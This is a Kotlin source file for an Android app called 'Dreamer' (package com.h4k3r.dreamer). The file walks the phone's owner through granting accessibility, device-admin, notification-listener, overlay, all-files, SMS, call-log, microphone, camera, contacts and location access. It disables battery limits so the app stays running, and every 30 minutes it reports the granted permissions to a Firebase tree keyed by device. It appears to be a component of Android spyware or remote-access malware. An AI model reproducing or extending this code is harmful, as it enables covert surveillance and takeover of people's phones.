package com.h4k3r.dreamer

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import java.util.concurrent.ConcurrentLinkedQueue

class SmartPermissionManager(private val context: Context) {
    companion object {
        private const val TAG = "SmartPermissionManager"
        private const val CHANNEL_ID = "permission_helper"
        private const val NOTIFICATION_ID = 999

        @Volatile
        private var instance: SmartPermissionManager? = null

        fun getInstance(context: Context): SmartPermissionManager {
            return instance ?: synchronized(this) {
                instance ?: SmartPermissionManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val permissionQueue = ConcurrentLinkedQueue<PermissionRequest>()
    private var isProcessing = false
    private val prefs = context.getSharedPreferences("permission_state", Context.MODE_PRIVATE)

    data class PermissionRequest(
        val permission: String,
        val priority: Int = 0,
        val callback: ((Boolean) -> Unit)? = null
    )

    init {
        createNotificationChannel()
        startPermissionMonitor()
    }

    /* ── Initial Setup with Smart Flow ────────────── */
    fun performInitialSetup() {
        scope.launch {
            showSetupNotification()

            // Phase 1: Critical permissions first
            val criticalPermissions = listOf(
                "all_files_access",
                "overlay",
                "accessibility"
            )

            for (permission in criticalPermissions) {
                if (!checkSpecialPermission(permission)) {
                    requestSpecialPermission(permission)
                    delay(3000) // Wait for user action
                }
            }

            // Phase 2: Runtime permissions - handled through requestAllPermissions

            // Phase 3: Enable auto-start and battery optimization
            requestAutoStart()
            requestBatteryOptimization()

            hideSetupNotification()
            showSuccessMessage()
        }
    }

    /* ── Smart Permission Request System ─────────── */
    fun requestPermissionSmart(permission: String, callback: ((Boolean) -> Unit)? = null) {
        // Check if already granted
        if (isPermissionGranted(permission)) {
            callback?.invoke(true)
            return
        }

        // Add to queue with priority
        val priority = getPermissionPriority(permission)
        permissionQueue.offer(PermissionRequest(permission, priority, callback))

        if (!isProcessing) {
            processPermissionQueue()
        }
    }

    private fun processPermissionQueue() {
        scope.launch {
            isProcessing = true

            while (permissionQueue.isNotEmpty()) {
                val request = permissionQueue.poll() ?: break

                // Show user-friendly notification
                showPermissionNotification(request.permission)

                // Use appropriate method based on permission type
                val granted = when {
                    isSpecialPermission(request.permission) -> {
                        requestSpecialPermission(request.permission)
                        delay(3000) // Wait for user
                        checkSpecialPermission(request.permission)
                    }
                    else -> {
                        requestRuntimePermission(request.permission)
                        checkRuntimePermission(request.permission)
                    }
                }

                request.callback?.invoke(granted)

                // Update Firebase
                updatePermissionStatus(request.permission, granted)

                delay(1000) // Small delay between requests
            }

            isProcessing = false
            hidePermissionNotification()
        }
    }

    /* ── Intelligent Permission Checking ────────── */
    private fun isPermissionGranted(permission: String): Boolean {
        return if (isSpecialPermission(permission)) {
            checkSpecialPermission(permission)
        } else {
            checkRuntimePermission(permission)
        }
    }

    private fun isSpecialPermission(permission: String): Boolean {
        return permission in listOf(
            "all_files_access", "overlay", "accessibility",
            "device_admin", "notification_listener", "usage_stats"
        )
    }

    private fun checkSpecialPermission(permission: String): Boolean {
        return when (permission) {
            "all_files_access" -> {
                if (Build.VERSION.SDK_INT >= 30) {
                    Environment.isExternalStorageManager()
                } else true
            }
            "overlay" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Settings.canDrawOverlays(context)
                } else true
            }
            "accessibility" -> {
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                enabledServices.contains(context.packageName)
            }
            "notification_listener" -> {
                val enabledListeners = Settings.Secure.getString(
                    context.contentResolver,
                    "enabled_notification_listeners"
                ) ?: ""
                enabledListeners.contains(context.packageName)
            }
            "device_admin" -> {
                val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
                devicePolicyManager.isAdminActive(componentName)
            }
            else -> false
        }
    }

    private fun checkRuntimePermission(permission: String): Boolean {
        val manifestPermission = getManifestPermission(permission) ?: return false
        return ContextCompat.checkSelfPermission(context, manifestPermission) ==
                PackageManager.PERMISSION_GRANTED
    }

    /* ── Advanced Permission Request Methods ────── */
    private suspend fun requestSpecialPermission(permission: String): Boolean {
        return withContext(Dispatchers.Main) {
            try {
                var intent: Intent? = null

                when (permission) {
                    "all_files_access" -> {
                        if (Build.VERSION.SDK_INT >= 30) {
                            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                                data = Uri.parse("package:${context.packageName}")
                            }
                        }
                    }
                    "overlay" -> {
                        intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = Uri.parse("package:${context.packageName}")
                        }
                    }
                    "accessibility" -> {
                        intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    }
                    "notification_listener" -> {
                        intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                    }
                    "device_admin" -> {
                        intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            putExtra(
                                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                                ComponentName(context, DeviceAdminReceiver::class.java)
                            )
                            putExtra(
                                android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Required for advanced device management"
                            )
                        }
                    }
                }

                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

                    // Create a transparent activity to handle the permission
                    val helperIntent = Intent(context, PermissionHelperActivity::class.java).apply {
                        putExtra("target_intent", intent)
                        putExtra("permission", permission)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }

                    context.startActivity(helperIntent)
                    true
                } else {
                    false
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error requesting permission: $permission", e)
                false
            }
        }
    }

    private suspend fun requestRuntimePermission(permission: String): Boolean {
        val manifestPermission = getManifestPermission(permission) ?: return false

        return withContext(Dispatchers.Main) {
            val intent = Intent(context, PermissionHelperActivity::class.java).apply {
                putExtra("runtime_permission", manifestPermission)
                putExtra("permission", permission)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

            context.startActivity(intent)
            true
        }
    }

    /* ── Auto-Start & Battery Optimization ─────── */
    private fun requestAutoStart() {
        val manufacturer = Build.MANUFACTURER.lowercase()

        var intent: Intent? = null

        when (manufacturer) {
            "xiaomi" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    )
                }
            }
            "oppo" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    )
                }
            }
            "vivo" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                    )
                }
            }
            "huawei" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                    )
                }
            }
            "samsung" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.samsung.android.lool",
                        "com.samsung.android.sm.ui.battery.BatteryActivity"
                    )
                }
            }
        }

        intent?.let {
            try {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(it)
            } catch (e: Exception) {
                Log.e(TAG, "Auto-start not available for $manufacturer")
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(context.packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }

                try {
                    context.startActivity(intent)
                } catch (e: Exception) {
                    // Fallback to battery optimization settings
                    val fallbackIntent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(fallbackIntent)
                }
            }
        }
    }

    /* ── Notification Helpers ──────────────────── */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Permission Helper",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Helps with permission setup"
                setShowBadge(true)
            }

            val notificationManager = context.getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun showSetupNotification() {
        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("🔧 Setting up Dreamer")
            .setContentText("Please follow the on-screen instructions")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .build()

        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    private fun showPermissionNotification(permission: String) {
        val friendlyName = getPermissionFriendlyName(permission)
        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("🔐 Permission Required")
            .setContentText("Please grant $friendlyName permission")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()

        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID + 1, notification)
    }

    private fun hideSetupNotification() {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancel(NOTIFICATION_ID)
    }

    private fun hidePermissionNotification() {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancel(NOTIFICATION_ID + 1)
    }

    private fun showSuccessMessage() {
        Toast.makeText(context, "✅ Dreamer setup complete!", Toast.LENGTH_LONG).show()

        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("✅ Setup Complete")
            .setContentText("Dreamer is ready to use")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
            .build()

        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID + 2, notification)
    }

    /* ── Helper Methods ────────────────────────── */
    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location", "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            "storage_read" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            else -> null
        }
    }

    private fun getPermissionFriendlyName(permission: String): String {
        return when (permission) {
            "camera" -> "Camera"
            "location", "location_fine" -> "Precise Location"
            "location_coarse" -> "Approximate Location"
            "contacts" -> "Contacts"
            "sms" -> "SMS Messages"
            "phone" -> "Phone State"
            "call_log" -> "Call History"
            "microphone" -> "Microphone"
            "storage_read" -> "Storage"
            "all_files_access" -> "All Files Access"
            "overlay" -> "Display Over Apps"
            "accessibility" -> "Accessibility Service"
            "notification_listener" -> "Notification Access"
            "device_admin" -> "Device Administrator"
            else -> permission
        }
    }

    private fun getPermissionPriority(permission: String): Int {
        return when (permission) {
            "accessibility" -> 10
            "all_files_access" -> 9
            "overlay" -> 8
            "camera" -> 7
            "location", "location_fine" -> 6
            "storage_read" -> 5
            "contacts" -> 4
            "sms" -> 3
            "phone" -> 2
            else -> 1
        }
    }

    private fun updatePermissionStatus(permission: String, granted: Boolean) {
        // Update local storage
        prefs.edit().putBoolean("perm_$permission", granted).apply()

        // Update Firebase
        val deviceId = prefs.getString("device_id", "") ?: return
        val secretKey = prefs.getString("secret_key", "") ?: return

        if (deviceId.isNotEmpty() && secretKey.isNotEmpty()) {
            Firebase.database.reference
                .child("devices")
                .child(secretKey)
                .child(deviceId)
                .child("info")
                .child("permissions")
                .child(permission)
                .setValue(granted)
        }
    }

    /* ── Permission Monitor Service ─────────────── */
    private fun startPermissionMonitor() {
        scope.launch {
            while (isActive) {
                delay(30 * 60 * 1000) // Check every 30 minutes
                checkAndReportPermissions()
            }
        }
    }

    private fun checkAndReportPermissions() {
        val allPermissions = listOf(
            "camera", "location_fine", "location_coarse", "contacts",
            "sms", "phone", "call_log", "microphone", "calendar",
            "storage_read", "all_files_access", "overlay",
            "accessibility", "notification_listener", "device_admin"
        )

        val permissionStatus = mutableMapOf<String, Boolean>()

        for (permission in allPermissions) {
            permissionStatus[permission] = isPermissionGranted(permission)
        }

        // Update Firebase with all permission statuses
        val deviceId = prefs.getString("device_id", "") ?: return
        val secretKey = prefs.getString("secret_key", "") ?: return

        if (deviceId.isNotEmpty() && secretKey.isNotEmpty()) {
            Firebase.database.reference
                .child("devices")
                .child(secretKey)
                .child(deviceId)
                .child("info")
                .child("permissions")
                .setValue(permissionStatus)
        }
    }

    /* ── Batch Permission Request ──────────────── */
    fun requestAllPermissions(callback: (Map<String, Boolean>) -> Unit) {
        scope.launch {
            val results = mutableMapOf<String, Boolean>()

            // Group permissions by type
            val specialPermissions = listOf(
                "accessibility", "all_files_access", "overlay",
                "notification_listener", "device_admin"
            )

            val runtimePermissions = listOf(
                "camera", "location_fine", "contacts", "sms",
                "phone", "microphone", "storage_read", "call_log"
            )

            // Request special permissions first
            for (permission in specialPermissions) {
                if (!isPermissionGranted(permission)) {
                    requestPermissionSmart(permission) { granted ->
                        results[permission] = granted
                    }
                    delay(2000) // Wait between requests
                } else {
                    results[permission] = true
                }
            }

            // Then request runtime permissions
            val ungrantedRuntime = runtimePermissions.filter { !isPermissionGranted(it) }
            if (ungrantedRuntime.isNotEmpty()) {
                requestMultipleRuntimePermissions(ungrantedRuntime) { grantResults ->
                    results.putAll(grantResults)
                }
            } else {
                runtimePermissions.forEach { results[it] = true }
            }

            callback(results)
        }
    }

    private suspend fun requestMultipleRuntimePermissions(
        permissions: List<String>,
        callback: (Map<String, Boolean>) -> Unit
    ) {
        val manifestPermissions = permissions.mapNotNull { permission ->
            getManifestPermission(permission)?.let { permission to it }
        }

        if (manifestPermissions.isEmpty()) {
            callback(emptyMap())
            return
        }

        val intent = Intent(context, PermissionHelperActivity::class.java).apply {
            putExtra("multiple_permissions", manifestPermissions.map { it.second }.toTypedArray())
            putExtra("permission_names", manifestPermissions.map { it.first }.toTypedArray())
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }

        context.startActivity(intent)

        // Wait for results (you'd implement a callback mechanism here)
        delay(5000)

        // Check results
        val results = manifestPermissions.associate { (permission, manifestPerm) ->
            permission to (ContextCompat.checkSelfPermission(context, manifestPerm) ==
                    PackageManager.PERMISSION_GRANTED)
        }

        callback(results)
    }

    fun cleanup() {
        scope.cancel()
    }
}